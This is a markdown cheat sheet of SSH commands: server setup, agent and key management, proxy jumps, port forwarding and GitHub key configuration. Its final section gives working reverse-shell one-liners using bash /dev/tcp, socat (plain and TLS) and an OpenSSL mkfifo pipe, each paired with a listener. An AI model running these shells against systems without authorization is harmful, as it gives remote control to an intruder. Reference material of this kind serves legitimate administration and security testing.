# SSH

## Enable SSH Server (Debian)

```
sudo apt install openssh-server
sudo systemctl enable ssh
sudo systemctl start ssh
sudo ufw allow ssh
sudo ufw enable
```

## SSH Agent
List ssh-agent keys
`ssh-add -l`

Add SSH Key to the ssh-agent
`ssh-add </path/to/your/private/key>`

Remove Key from the ssh-agent
`ssh-add -d </path/to/your/private/key>`

Start the ssh-agent
`eval "$(ssh-agent -s)"`

Restart the ssh-agent
`eval "$(ssh-agent -k)"  # Kill the agent`
`eval "$(ssh-agent)"     # Start a fresh instance`

## Keys
Generate new key
`ssh-keygen -t rsa -b 4096 -C <email@domain.com>` 

Generate new key using ed25519 (best practice) `ssh-keygen -t ed25519 -C <your_email@example.com>`

Copy key to remote
`ssh-copy-id -i $<key_path> <user>@<hostname/ip>`

Use a specific key during connection
`ssh -o "IdentitiesOnly=yes" -i <key_path> -p <port> <user><hostname/ip>`

Use **only** password authentication (if is is allowed)
`ssh -o PubkeyAuthentication=no user>@<hostname/ip>`

## Proxy Jump
SSH proxy jump
`ssh -J <user-proxy>@<domain/ip-proxy> <user-target>@<domai/ip-target>`

SSh proxy jump on user configuration (~/.ssh/config)
```
Host <proxy-host-name>
  HostName <IP-address>
  User <user-name>                  # Not important
  Port <specify-port-number-here>   # Not important
  IdentityFile ~/.ssh/<file1>       # Not important

### The Remote Host
Host <private-server-name>
  HostName <IP-address>             # Not important
  User <user-name>                  # Not important
  Port <specify-port-number-here>   # Not important
  IdentityFile ~/.ssh/<file2>       # Not important
  ProxyJump <proxy-host-name>
```

## Configuration
Check SSH Configuration
`ssh -G <hostname>`

Global configuration filepath
`/etc/ssh/ssh_config`

## Other connections
Remote Command Execution
`ssh <user>@<hostname/ip> "<command>"`

Local Port Forwarding (Forward a port from the remote machine to your local machine)
`ssh -L <local_port>:<remote_host>:<remote_port> -N <user>@<hostname/ip>` # Use -N if you don’t need a shell session

Remote Port Forwarding: (Forward a port from your local machine to a remote machine)
`ssh -R <remote_port>:<local_host>:<local_port> -N <user>@<hostname/ip>` # Use -N if you don’t need a shell session

Create an SSH SOCKS proxy for dynamic port forwarding
`ssh -D <local_port> <user>@<hostname>`

## Use SSH key on Github

1. Run `ssh-keygen -t ed25519 -C "your_email@example.com"`
2. `cat ~/.ssh/<keyname>.pub` and copy your key
3. Paste it as is on your github account as an authentication key
4. Add on your `~/.ssh/config` this:
```
Host github.com
  HostName github.com
  User git
  IdentityFile ~/.ssh/<keyname>
  IdentitiesOnly yes
  IdentityAgent none
  AddKeysToAgent no
```
5. Evaluate that it is working by running `ssh -T git@github.com`
6. For security run `chmod 400 ~/.ssh/<keyname>`
7. If you have repositories that have been cloned using https, do the following
```
# Inspect remotes
git remote -v

# Update
git remote set-url origin git@github.com:Username/repository-name.git

# Inspect remotes again
```

## Reverse shell 


> [!WARNING]
> Use reverse shell only on systems that you have explicit authorization to access.

### 1. Using Bash
**Listener** (the machine that wants to establish the ssh connection)
```bash
nc -lvnp <port>
```

From the **target** machine run one of the commands based on the use case.

1. Terminal
```bash
while true; do bash -c "/bin/bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" ; sleep 5 ; done
```

### 2. Socat [Preferred]
Reverse Shell with socat (recommended for stability). Socat is very reliable and supports full TTY and encryption (TLS) if needed.

Installation
```
sudo apt install socat
```

On the **listener**:
```
socat file:`tty`,raw,echo=0 tcp-listen:<port>,reuseaddr
```

On the **target** (your device):
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<your-ip>:<port>
```

#### How to add encryption:
**Listener**
```bash
# Create certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
cat key.pem cert.pem > fullchain.pem

# Start listener
socat openssl-listen:<port>,reuseaddr,fork,cert=cert.pem,key=key.pem,cafile=cert.pem,verify=0 file:`tty`,raw,echo=0
```

**Target**
```bash
socat openssl-connect:<your-ip>:<port>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

### 4. OpenSSL
A bit more complex but adds encryption.

On the **listener**:
```
openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.pem
openssl s_server -quiet -key cert.pem -cert cert.pem -port <port>
```

On the **target**:
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ip>:<port> > /tmp/s
```